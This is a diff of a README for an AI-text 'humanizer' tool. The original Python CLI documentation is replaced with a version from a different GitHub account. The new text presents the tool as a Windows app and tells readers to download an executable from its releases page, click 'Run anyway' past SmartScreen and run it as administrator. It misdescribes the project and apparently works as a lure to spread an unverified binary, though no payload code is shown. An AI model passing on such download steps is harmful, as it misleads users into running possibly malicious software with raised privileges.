@@ -1,285 +1,143 @@
-# humanizer-workbench
+# 🤖 humanizer-workbench - Rewrite AI Text Into Natural Writing
 
-A CLI tool and Claude Code skill for rewriting AI-generated text into natural, human-quality writing.
+[![Download humanizer-workbench](https://img.shields.io/badge/Download%20humanizer-workbench-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aprempeh-tech/humanizer-workbench/releases)
 
-Every LLM reaches for the same words. This removes them.
+## ✨ What this app does
 
----
+humanizer-workbench helps you turn AI-written text into writing that sounds more natural and human. It gives you a simple way to rewrite text for emails, posts, notes, articles, and other everyday writing tasks.
 
-AI-generated text has a recognizable fingerprint. Not because it's wrong (often it isn't), but because every language model reaches for the same vocabulary at rates no human writer reproduces: leverage, tapestry, seamless, nuanced, comprehensive. The same sentence rhythm. Paragraph lengths that never vary. Filler openers like "it is worth noting that."
+It includes:
+- a command-line tool for local use
+- a Claude Code skill for rewrite tasks
+- simple controls for text cleanup and tone changes
+- output that keeps the original meaning while improving flow
 
-humanizer-workbench detects those patterns and rewrites through a staged pipeline: identify what's AI-like, rewrite for style, refine for rhythm, audit the result. The stages are separate because each requires a different prompt to do its job well.
+## 💻 What you need
 
-Use it as a CLI tool for batch processing and scripts, or as a Claude Code skill for interactive rewriting inside Claude Code sessions.
+Before you start, make sure you have:
+- a Windows PC
+- a web browser
+- permission to download files
+- enough free space for the app and its files
+- a text editor, if you want to copy and save output
 
----
+The app is made for Windows users who want a fast way to rewrite text without learning a full writing workflow.
 
-## Quick example
+## 📥 Download humanizer-workbench
 
-**Input:**
+Visit this page to download the Windows file:
 
-```
-It is worth noting that this comprehensive approach leverages robust documentation
-strategies to facilitate seamless onboarding for engineering teams. Furthermore,
-proactive knowledge transfer empowers developers to optimize their workflows and
-achieve unprecedented productivity outcomes.
-```
+[https://github.com/aprempeh-tech/humanizer-workbench/releases](https://github.com/aprempeh-tech/humanizer-workbench/releases)
 
-**Output** (`--style professional --intensity medium`):
+On the releases page:
+1. open the latest release
+2. find the Windows download file
+3. save the file to your PC
+4. open the file after the download finishes
 
-```
-Good documentation cuts onboarding time. Engineers who can find answers without
-interrupting teammates get productive faster, and the teams they join stay focused
-longer. Most documentation failures are about findability, not volume.
-```
+If Windows asks for permission, choose the option that lets the app run.
 
-**AI-likeness score:** 72/100 → 8/100
+## 🪟 Install and set up on Windows
 
----
+After you download the file:
 
-## CLI tool and Claude Code skill
+1. open File Explorer
+2. go to your Downloads folder
+3. find the humanizer-workbench file
+4. double-click the file to start it
+5. follow the on-screen steps
 
-| Interface | Use case |
-|-----------|----------|
-| CLI | Batch processing, pipelines, file-to-file transforms |
-| Claude Code skill | Interactive sessions in Claude Code, editing inline |
+If the file comes in a zip folder:
+1. right-click the zip file
+2. choose Extract All
+3. open the extracted folder
+4. run the app from there
 
-Both use the same detection logic and scoring system.
+If Windows SmartScreen appears:
+1. click More info
+2. choose Run anyway if you trust the file source
 
----
+## 🚀 How to use it
 
-## Installation
+After the app opens, you can use it to rewrite text in a few simple steps:
 
-### CLI
+1. paste your AI-generated text into the input area
+2. choose the rewrite mode you want
+3. start the rewrite
+4. review the result
+5. copy the final text into your document, email, or post
 
-Requires Python 3.11+ and an Anthropic API key.
+Common use cases:
+- making AI text sound more natural
+- cleaning up stiff wording
+- changing tone for a more human voice
+- rewriting content for school, work, or online posts
 
-```bash
-pip install humanizer-workbench
-export ANTHROPIC_API_KEY=sk-ant-...
-```
+## 🧠 Best results
 
-From source:
+Use short source text when you test the app first. This helps you see how the rewrite style works.
 
-```bash
-git clone https://github.com/puneethkotha/humanizer-workbench
-cd humanizer-workbench
-pip install -e ".[dev]"
-```
+For better output:
+- keep your original meaning clear
+- remove extra repetition before rewriting
+- use plain input text
+- check names, dates, and facts after the rewrite
+- make a second pass if the text needs a softer tone
 
-### Claude Code skill usage
+If you want a more natural result, write the input as if you were giving notes to a person, not a prompt to a machine.
 
-```bash
-mkdir -p ~/.claude/skills
-git clone https://github.com/puneethkotha/humanizer-workbench ~/.claude/skills/humanizer-workbench
-```
+## 🛠️ Claude Code skill use
 
-In a Claude Code session:
+humanizer-workbench also works as a Claude Code skill. That helps users fit text rewriting into a Claude-based workflow.
 
-```
-/humanizer-workbench
-```
+Use this when you want to:
+- rewrite text inside a Claude Code task
+- keep a shared style for your writing
+- apply the same humanizing rules to many text blocks
+- move from raw AI output to cleaner final copy
 
-Or naturally:
+This is useful for people who work with text often and want a repeatable process.
 
-```
-Use humanizer-workbench to rewrite this in a founder voice.
-```
+## 🧩 Common file types
 
----
+You may see one of these on the releases page:
+- `.exe` for Windows
+- `.zip` for a packed download
+- support files for setup or usage
 
-## Using the CLI
+If you are not sure which file to use, pick the Windows file from the latest release. If there is more than one file, choose the one made for your system.
 
-```bash
-# Default: professional style, medium intensity
-humanizer input.txt
+## 🔍 If the app does not open
 
-# Change style and intensity
-humanizer input.txt --style founder --intensity aggressive
+Try these steps:
+1. make sure the download finished
+2. open the file from the Downloads folder
+3. try running it as administrator
+4. extract the files if they came in a zip folder
+5. check that your Windows version is up to date
 
-# See exactly what changed and how scores moved
-humanizer input.txt --diff --score
+If text does not rewrite the way you expect:
+- use simpler input
+- shorten the text
+- remove formatting before pasting
+- try another rewrite pass
+- keep the main idea and key facts the same
 
-# Write to a file
-humanizer input.txt --style technical --output result.txt
+## 📚 Quick tips
 
-# Analyze without rewriting
-humanizer-detect input.txt
-```
+- Save your source text before rewriting
+- Test with one paragraph first
+- Compare the original and rewritten text
+- Keep names, numbers, and links for a final check
+- Use the result as a draft, then make small edits
 
-**Python API:**
+## 🏷️ Topics
 
-```python
-from humanizer import HumanizerEngine, Intensity, StyleName
+ai, ai-humanizer, ai-writing, anthropic, claude-code, cli-tool, humanizer, llm, nlp, python, rewrite-ai-text, text-humanizer, text-rewriting, writing-assistant, writing-tools
 
-engine = HumanizerEngine()
+## 📂 Repository
 
-result = engine.humanize(
-    text="It is worth noting that this comprehensive approach...",
-    style=StyleName.PROFESSIONAL,
-    intensity=Intensity.MEDIUM,
-)
-
-print(result.output)
-print(f"{result.before_score:.0f} → {result.after_score:.0f}")
-```
-
----
-
-## CLI reference
-
-```
-humanizer [OPTIONS] INPUT_FILE
-
-  INPUT_FILE    Plain text file. Use '-' to read from stdin.
-
-Options:
-  -s, --style      [casual|professional|technical|founder|academic|storytelling]
-                   Default: professional
-  -i, --intensity  [light|medium|aggressive]
-                   Default: medium
-  --diff           Show a before/after diff
-  --score          Show AI-likeness scores before and after
-  --explain        Summarize the key changes made
-  -o, --output     Write output to a file instead of stdout
-  --api-key        Anthropic API key (or set ANTHROPIC_API_KEY)
-```
-
-```
-humanizer-detect INPUT_FILE
-
-  Scans for AI patterns and scores the text without rewriting it.
-  Shows component scores, detected vocabulary, filler phrases, and structural flags.
-```
-
----
-
-## Style presets
-
-The styles produce meaningfully different output: different structure, vocabulary, and voice, not just different prompt framing.
-
-| Style | Voice | What changes |
-|-------|-------|--------------|
-| `casual` | Conversational, first-person | Contractions, shorter sentences, no corporate language |
-| `professional` | Peer-to-peer, direct | Conclusions before explanations, active voice, specific over vague |
-| `technical` | Dense, expert-to-expert | No hand-holding, quantified claims, tradeoffs named |
-| `founder` | Personal, opinionated | First-person, stories before abstractions, specific dates and failures |
-| `academic` | Analytical, measured | Evidence-backed claims, hedges only where the evidence warrants |
-| `storytelling` | Scene-first, varied pace | Shows over tells, deliberate sentence length variation |
-
----
-
-## Intensity levels
-
-| Level | Stages | What it does |
-|-------|--------|--------------|
-| `light` | REWRITE | Removes AI vocabulary and filler phrases. Structure mostly preserved. |
-| `medium` | REWRITE → REFINE | Rewrites for style, then improves rhythm. Default. |
-| `aggressive` | REWRITE → REFINE → AUDIT | Full transformation. AUDIT reads output fresh and catches what's still wrong. |
-
----
-
-## AI-likeness score
-
-The score (0–100) combines five signals. Higher means more AI-like.
-
-| Signal | Max | Measures |
-|--------|-----|----------|
-| AI vocabulary density | 30 | Ratio of flagged words to total words |
-| Filler phrase density | 25 | Distinct filler phrases found |
-| Sentence length uniformity | 20 | Inverted std dev of sentence lengths |
-| Structural patterns | 15 | Em dash count, list density, opener patterns |
-| AI sentence openers | 10 | Formulaic starters in the first five sentences |
-
-Grade labels: **Very AI-like** (≥75) · **Moderately AI-like** (≥50) · **Slightly AI-like** (≥25) · **Mostly human** (<25)
-
-The score is a diagnostic tool. The tool does not refuse to output text because the score is too high. That call belongs to the user.
-
----
-
-## How it works
-
-Two detectors scan the input before any transformation. The lexical detector checks against ~50 AI-characteristic vocabulary words and ~30 filler phrases. The structural detector checks sentence length variance, paragraph uniformity, em dash frequency, and opener patterns. Detection results are injected into the rewrite prompt so the model knows exactly what to fix.
-
-The transformer calls the Anthropic API with a distinct prompt per stage. The REWRITE prompt carries the style voice, vocabulary guidance, intensity instructions, and the specific patterns found. REFINE targets rhythm only. AUDIT is a short, fresh read. It doesn't carry the full style context forward, just enough to catch what's still wrong.
-
-Stage temperatures are tuned separately: 0.7 for REWRITE, 0.45 for REFINE, 0.3 for AUDIT. Lower temperature on the later stages preserves what the earlier passes got right.
-
----
-
-## Architecture
-
-```
-src/humanizer/
-    core/
-        models.py       # All data types
-        engine.py       # Orchestrator
-        pipeline.py     # Stage sequences per intensity level
-    detectors/
-        lexical.py      # Vocabulary and filler phrase detection
-        structural.py   # Rhythm, formatting, and opener detection
-    styles/
-        presets.py      # The six built-in styles
-    transformers/
-        llm.py          # Anthropic API transformer with stage-specific prompts
-    scoring/
-        scorer.py       # Five-component heuristic scorer
-    cli/
-        main.py         # Click CLI
-```
-
-The engine depends on `BaseDetector`, `BaseTransformer`, and `AIScorer`, not their implementations. Adding a new detector or transformer backend requires no engine changes.
-
-Full architecture notes: [docs/architecture.md](docs/architecture.md)
-
----
-
-## Design notes
-
-**Separate stages for separate goals.** One prompt doing detection, rewriting, and rhythm editing produces mediocre results at all three. Keeping them separate lets each prompt be precise about what it's trying to do.
-
-**Styles are behavioral.** The `founder` style writes in first person and leads with what went wrong. The `professional` style leads with conclusions. The `academic` style hedges only where the evidence is genuinely ambiguous. These differences live in structured `StylePreset` dataclasses with explicit voice, vocabulary, and structural guidance, not in prompt strings.
-
-**No unnecessary dependencies.** Sentence splitting uses regex. Three runtime dependencies: `anthropic`, `click`, `rich`.
-
-**The scorer guides, it doesn't gate.** The score is shown as a before/after delta. The tool does not refuse to output text because the score is too high. That call belongs to the user.
-
----
-
-## Limitations
-
-**The heuristics are not domain-universal.** The vocabulary list was calibrated against general AI output. Technical or academic writing may score higher than warranted because those domains legitimately use some flagged terms. Run `humanizer-detect` first to see which signals are firing.
-
-**Quality degrades above ~1500 words.** The transformer processes the full text in one call. Above that threshold, you'll get a warning and less consistent output. Chunking is on the roadmap.
-
-**Detection is statistical, not semantic.** "Leverage" flagged in a piece about physical mechanics is a false positive. The detector doesn't understand context.
-
-**No cross-section consistency.** Rewriting a long document in sections may produce stylistic drift between them.
-
-**Improvement is not guaranteed on clean text.** Run `humanizer-detect` first if you're not sure whether a piece needs work.
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for setup and guidelines.
-
-```bash
-pip install -e ".[dev]"
-
-# Unit tests — no API key required
-pytest tests/ -m "not integration"
-
-# Integration tests — requires ANTHROPIC_API_KEY
-pytest tests/ -m integration
-
-ruff check src/ tests/
-```
-
-The most useful contributions right now: expanding the detection vocabulary list, improving scoring calibration against labeled examples, and adding chunking support for long documents.
-
----
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+- Name: humanizer-workbench
+- Type: AI humanizer tool
+- Use: rewrite AI-generated text into natural human writing
+- Platform focus: Windows download from releases
